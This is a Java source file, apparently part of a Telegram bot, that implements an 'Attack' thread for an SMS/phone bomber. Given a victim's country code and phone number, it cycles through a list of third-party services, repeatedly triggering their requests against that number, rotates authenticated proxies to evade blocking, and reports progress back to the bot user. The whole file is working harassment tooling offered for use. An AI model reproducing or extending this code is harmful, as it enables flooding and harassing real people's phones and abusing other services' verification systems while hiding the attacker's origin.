package com.example.webapp.telegram.bomber;


import com.example.webapp.Logger;
import com.example.webapp.telegram.Bot;
import com.example.webapp.telegram.bomber.services.utils.Service;
import com.example.webapp.telegram.bomber.services.Services;
import com.example.webapp.telegram.entities.UserEntity;
import org.jetbrains.annotations.NotNull;

import java.util.List;
import java.util.concurrent.CountDownLatch;

import okhttp3.Call;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.objects.Message;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;

public class Attack extends Thread {
    private static final String TAG = "Attack";

    private final Callback callback;
    private final String countryCode;
    private final String phone;
    private final int numberOfCycles;
    private final List<AuthProxy> proxies;
    private final UserEntity user;
    private Message message;

    private int progress = 0;

    private CountDownLatch tasks;

    private static final OkHttpClient.Builder clientBuilder = new OkHttpClient.Builder()
            .addInterceptor(chain -> {
                Request request = chain.request();
                Logger.sendBomber(String.format("Sending request %s", request.url()));

                Response response = chain.proceed(request);
                Logger.sendBomber(String.format("Received response for %s with status code %s",
                        response.request().url(), response.code()));

                return response;
            });

    public Attack(Callback callback, String countryCode, String phone, int cycles,
                  List<AuthProxy> proxies, UserEntity user, Message message) {
        super(phone);

        this.callback = callback;
        this.countryCode = countryCode;
        this.phone = phone;
        this.proxies = proxies;

        numberOfCycles = cycles;
        this.user = user;
        this.message = message;
    }

    @Override
    public void run() {
        List<Service> usableServices = Services.getUsableServices(countryCode);

        callback.onAttackStart(usableServices.size(), numberOfCycles);
        Logger.sendBomber(String.format("Starting attack on +%s%s", countryCode, phone));

        clientBuilder.proxy(null);

        for (int cycle = 0; cycle < numberOfCycles; cycle++) {
            if (!proxies.isEmpty()) {
                AuthProxy authProxy = proxies.get(cycle % proxies.size());
                clientBuilder.proxy(authProxy)
                        .proxyAuthenticator(authProxy);
            }

            OkHttpClient client = clientBuilder.build();

            Logger.sendBomber(String.format("Started cycle %s", cycle));
            tasks = new CountDownLatch(usableServices.size());

            for (Service service : usableServices) {
                try {
                    service.prepare(countryCode, phone);
                    service.run(client, new com.example.webapp.telegram.bomber.services.utils.Callback() {
                        @Override
                        public void onError(Exception e) {
                            Logger.sendBomber(String.format("%s returned error : %s", service.getClass().getName(), e.toString()));
                            tasks.countDown();
                        }

                        @Override
                        public void onResponse(@NotNull Call call, @NotNull Response response) {
                            if (!response.isSuccessful()) {
                                Logger.sendBomber(String.format("%s returned error : %s", service.getClass().getName(), response.code()));
                            }

                            tasks.countDown();
                            callback.onProgressChange(progress++);
                        }
                    });
                } catch (StringIndexOutOfBoundsException e) {
                    Logger.sendBomber(String.format("%s returned error", service.getClass().getName()));
                }
            }

            try {
                tasks.await();
            } catch (InterruptedException e) {
                break;
            }
        }

        callback.onAttackEnd();
        Logger.sendBomber(String.format("Attack on +%s%s ended", countryCode, phone));
    }
}
